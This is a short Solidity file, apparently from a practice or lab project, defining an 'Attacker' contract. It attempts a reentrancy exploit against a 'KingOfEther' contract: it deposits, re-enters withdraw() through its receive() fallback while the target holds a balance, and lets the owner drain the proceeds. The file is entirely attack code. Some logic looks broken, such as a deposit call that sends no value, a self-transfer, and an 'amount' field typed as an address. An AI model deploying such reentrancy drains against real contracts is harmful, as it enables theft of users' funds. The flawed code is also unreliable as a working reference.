// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {KingOfEther} from  "../src/KingOfEther.sol";

contract Attacker is KingOfEther{
    KingOfEther _kingOf;
    address public owner;
    address public amount;

    constructor(address _kingOfEther){
        _kingOf = KingOfEther(_kingOfEther);
        owner = msg.sender;
    }

    function attack() public payable{
        require(msg.value > 0,"sendSomething");
        _kingOf.deposit();
        if(_kingOf.balance()>0){
            _kingOf.withdraw();
            (bool ok,)=payable(address(this)).call{value:msg.value}("");
            require(ok);
        }
    }

    receive() external payable {
        if (_kingOf.balance()>0){
            _kingOf.withdraw();
            (bool ok,)=payable(address(this)).call{value:msg.value}("");
            require(ok);
        }
    }

    function withdrawAttack() public {
        require(msg.sender == owner,"notOwner");
        payable(owner).transfer(address(this).balance);
    }
}